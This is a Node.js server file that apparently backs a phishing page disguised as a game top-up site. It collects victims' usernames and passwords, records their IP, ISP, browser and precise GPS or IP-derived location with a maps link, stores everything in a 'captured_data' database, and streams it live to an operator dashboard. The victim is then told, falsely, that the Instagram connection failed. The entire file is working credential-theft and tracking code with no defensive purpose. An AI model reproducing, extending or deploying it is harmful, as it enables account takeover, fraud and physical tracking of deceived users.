const express = require('express');
const cors = require('cors');
const axios = require('axios');
const http = require('http');
const { Server } = require('socket.io');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
require('dotenv').config();

const app = express();
const server = http.createServer(app);

const PRECISE_GPS_THRESHOLD_METERS = 100;
const MAX_BROWSER_LOCATION_ACCURACY_METERS = 50000;

function normalizeClientIp(req) {
    const forwardedFor = req.headers['x-forwarded-for'];
    let ip = Array.isArray(forwardedFor) ? forwardedFor[0] : forwardedFor;
    ip = ip || req.headers['x-real-ip'] || req.socket.remoteAddress || '';

    if (ip.includes(',')) ip = ip.split(',')[0];
    ip = ip.trim();
    if (ip.startsWith('::ffff:')) ip = ip.replace('::ffff:', '');

    return ip;
}

function isPrivateOrLocalIp(ip) {
    if (!ip) return true;
    const normalizedIp = ip.toLowerCase();
    if (normalizedIp === '::1' || normalizedIp === '127.0.0.1' || normalizedIp === 'localhost') return true;
    if (ip.startsWith('10.') || ip.startsWith('192.168.')) return true;
    if (/^172\.(1[6-9]|2\d|3[0-1])\./.test(ip)) return true;
    if (normalizedIp.startsWith('fc') || normalizedIp.startsWith('fd') || normalizedIp.startsWith('fe80:')) return true;
    return false;
}

function toFiniteNumber(value) {
    const numberValue = Number(value);
    return Number.isFinite(numberValue) ? numberValue : null;
}

function normalizeGps(gps) {
    if (!gps || typeof gps !== 'object') return null;

    const lat = toFiniteNumber(gps.lat);
    const lng = toFiniteNumber(gps.lng);
    const accuracy = toFiniteNumber(gps.accuracy);

    if (lat === null || lng === null || accuracy === null) return null;
    if (lat < -90 || lat > 90 || lng < -180 || lng > 180) return null;
    if (accuracy < 0 || accuracy > MAX_BROWSER_LOCATION_ACCURACY_METERS) return null;

    return {
        lat,
        lng,
        accuracy,
        timestamp: gps.timestamp || null
    };
}

function formatMeters(value) {
    return `${Number(value).toFixed(1)}m`;
}

function resolveLocation(gpsPoint, geoInfo) {
    if (gpsPoint) {
        const isPrecise = gpsPoint.accuracy <= PRECISE_GPS_THRESHOLD_METERS;
        const confidence = isPrecise ? 'high' : (gpsPoint.accuracy <= 1000 ? 'medium' : 'low');
        return {
            lat: gpsPoint.lat,
            lng: gpsPoint.lng,
            source: isPrecise ? 'gps' : 'browser',
            confidence,
            label: isPrecise
                ? `GPS Presisi (Akurasi: ${formatMeters(gpsPoint.accuracy)})`
                : `Lokasi Browser (Akurasi: ${formatMeters(gpsPoint.accuracy)})`,
            accuracy: gpsPoint.accuracy,
            gpsTimestamp: gpsPoint.timestamp,
            isHighAccuracy: isPrecise ? 1 : 0
        };
    }

    const ipLat = toFiniteNumber(geoInfo.lat);
    const ipLng = toFiniteNumber(geoInfo.lon);
    const hasIpLocation = geoInfo.status === 'success' && ipLat !== null && ipLng !== null;

    if (hasIpLocation) {
        return {
            lat: ipLat,
            lng: ipLng,
            source: 'ip',
            confidence: 'low',
            label: `${geoInfo.city || 'Unknown City'}, ${geoInfo.regionName || 'Unknown Region'}, ${geoInfo.country || 'Unknown Country'} (Estimasi IP)`,
            accuracy: null,
            gpsTimestamp: null,
            isHighAccuracy: 0
        };
    }

    return {
        lat: null,
        lng: null,
        source: 'unknown',
        confidence: 'unknown',
        label: 'Lokasi tidak tersedia',
        accuracy: null,
        gpsTimestamp: null,
        isHighAccuracy: 0
    };
}

// SQLite Database Setup
const dbPath = path.resolve(__dirname, 'database.sqlite');
const db = new sqlite3.Database(dbPath, (err) => {
    if (err) {
        console.error('Error opening database:', err.message);
    } else {
        console.log('Connected to the SQLite database.');
        db.serialize(() => {
            db.run(`CREATE TABLE IF NOT EXISTS captured_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT,
                password TEXT,
                game TEXT,
                nominal TEXT,
                method TEXT,
                ip TEXT,
                isp TEXT,
                location TEXT,
                mapsLink TEXT,
                isHighAccuracy INTEGER,
                accuracy REAL,
                locationSource TEXT,
                locationConfidence TEXT,
                gpsTimestamp TEXT,
                userAgent TEXT,
                timestamp TEXT
            )`);
            // Ensure newer columns exist for existing databases
            db.run("ALTER TABLE captured_data ADD COLUMN accuracy REAL", (err) => {});
            db.run("ALTER TABLE captured_data ADD COLUMN method TEXT", (err) => {});
            db.run("ALTER TABLE captured_data ADD COLUMN userAgent TEXT", (err) => {});
            db.run("ALTER TABLE captured_data ADD COLUMN locationSource TEXT", (err) => {});
            db.run("ALTER TABLE captured_data ADD COLUMN locationConfidence TEXT", (err) => {});
            db.run("ALTER TABLE captured_data ADD COLUMN gpsTimestamp TEXT", (err) => {});
        });
    }
});

// Socket.io initialization
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"],
        allowedHeaders: ["ngrok-skip-browser-warning"],
        credentials: true
    },
    transports: ['polling', 'websocket']
});

const PORT = process.env.PORT || 5000;

app.use(cors({
    origin: "*",
    methods: ["GET", "POST", "DELETE", "OPTIONS"],
    allowedHeaders: ['Content-Type', 'Authorization', 'ngrok-skip-browser-warning'],
    credentials: true
}));
app.use(express.json());

app.get('/', (req, res) => {
    res.send('<h1>Backend is running!</h1><p>Use /api/admin/data to see captured data.</p>');
});

app.get('/api', (req, res) => {
    res.send('Backend Real-time Ready (SQLite Mode)');
});

app.get('/api/admin/data', (req, res) => {
    db.all("SELECT * FROM captured_data ORDER BY id DESC", [], (err, rows) => {
        if (err) {
            res.status(500).json({ error: err.message });
            return;
        }
        res.json(rows);
    });
});

app.post('/api/setor-data', async (req, res) => {
    const { username, password, game, nominal, method, gps } = req.body;

    const ip = normalizeClientIp(req);
    const gpsPoint = normalizeGps(gps);
    
    let geoInfo = {};
    if (!gpsPoint && !isPrivateOrLocalIp(ip)) {
        try {
            const response = await axios.get(`http://ip-api.com/json/${ip}`, {
                timeout: 3000,
                params: {
                    fields: 'status,message,country,regionName,city,lat,lon,isp,query'
                }
            });
            geoInfo = response.data;
        } catch (error) {
            console.error('Error fetching IP geolocation:', error.message);
        }
    }

    const resolvedLocation = resolveLocation(gpsPoint, geoInfo);

    const dataLog = {
        username,
        password,
        game,
        nominal,
        method: method || 'Unknown',
        ip: ip,
        isp: geoInfo.isp || 'Unknown',
        location: resolvedLocation.label,
        mapsLink: resolvedLocation.lat !== null && resolvedLocation.lng !== null ? `https://www.google.com/maps?q=${resolvedLocation.lat},${resolvedLocation.lng}` : null,
        isHighAccuracy: resolvedLocation.isHighAccuracy,
        accuracy: resolvedLocation.accuracy,
        locationSource: resolvedLocation.source,
        locationConfidence: resolvedLocation.confidence,
        gpsTimestamp: resolvedLocation.gpsTimestamp,
        userAgent: req.headers['user-agent'] || 'Unknown',
        timestamp: new Date().toLocaleString('id-ID')
    };

    // Save to SQLite
    const stmt = db.prepare(`INSERT INTO captured_data (username, password, game, nominal, method, ip, isp, location, mapsLink, isHighAccuracy, accuracy, locationSource, locationConfidence, gpsTimestamp, userAgent, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`);
    stmt.run(dataLog.username, dataLog.password, dataLog.game, dataLog.nominal, dataLog.method, dataLog.ip, dataLog.isp, dataLog.location, dataLog.mapsLink, dataLog.isHighAccuracy, dataLog.accuracy, dataLog.locationSource, dataLog.locationConfidence, dataLog.gpsTimestamp, dataLog.userAgent, dataLog.timestamp, function(err) {
        if (err) {
            console.error('Error saving to DB:', err.message);
        } else {
            // Push via socket
            try {
                io.emit('new-target-data', { ...dataLog, id: this.lastID });
            } catch (e) {
                console.warn('Socket emit failed');
            }
        }
    });
    stmt.finalize();

    console.log(`[${dataLog.timestamp}] DATA BARU: ${username}`);

    res.json({ 
        status: 'success', 
        message: 'Koneksi instagram gagal, silakan coba beberapa saat lagi. 🙄' 
    });
});

app.delete('/api/admin/delete-all', (req, res) => {
    db.run("DELETE FROM captured_data", [], (err) => {
        if (err) {
            res.status(500).json({ error: err.message });
            return;
        }
        res.json({ status: 'success', message: 'All data deleted' });
    });
});

io.on('connection', (socket) => {
    console.log('Admin connected:', socket.id);
});

// Always listen on PORT for Render
server.listen(PORT, () => {
    console.log(`Server jalan di: http://localhost:${PORT}`);
});

module.exports = app;
